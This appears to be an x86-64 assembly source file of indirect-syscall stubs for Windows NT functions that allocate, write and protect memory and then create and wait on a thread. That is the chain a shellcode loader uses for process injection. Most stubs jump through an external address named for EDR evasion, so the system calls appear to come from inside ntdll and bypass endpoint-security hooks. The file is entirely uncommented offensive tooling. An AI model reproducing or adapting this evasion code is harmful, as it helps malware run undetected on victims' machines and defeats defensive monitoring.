global _NtAllocateVirtualMemory_stub
global _NtWriteVirtualMemory_stub
global _NtCreateThreadEx_stub
global _NtWaitForSingleObject_stub
global _NtProtectVirtualMemory_stub

extern sysAddrNtAllocateVirtualMemory
extern sysAddrNtWriteVirtualMemory
extern sysAddrNtCreateThreadEx
extern sysAddrNtWaitForSingleObject
extern sysAddrNtProtectVirtualMemory
extern edrJumpAddressR11_15
extern edrRetAddr

section .text

_NtProtectVirtualMemory_stub:
    mov r10, rcx
    mov eax, 0x50
    ;jmp qword [rel sysAddrNtProtectVirtualMemory]
    mov r11, qword [rel sysAddrNtProtectVirtualMemory]
    mov r12, [rel edrJumpAddressR11_15]
    jmp r12


_NtAllocateVirtualMemory_stub: 
    mov r10, rcx
    xor eax, eax
    add eax, 0x18
    mov r11, qword [rel sysAddrNtAllocateVirtualMemory]
    mov r12, [rel edrJumpAddressR11_15]
    jmp r12

_NtWriteVirtualMemory_stub:
    mov r10, rcx
    mov eax, 0x3A
    mov r11, qword [rel sysAddrNtWriteVirtualMemory]
    mov r12, [rel edrJumpAddressR11_15]
    ;mov r13, qword [rel edrRetAddr]
    ;push r13
    jmp r12

_NtCreateThreadEx_stub:
    mov r10, rcx
    mov eax, 0xC7
    jmp qword [rel sysAddrNtCreateThreadEx]

_NtWaitForSingleObject_stub:
    mov r10, rcx
    mov eax, 0x4
    jmp qword [rel sysAddrNtWaitForSingleObject]

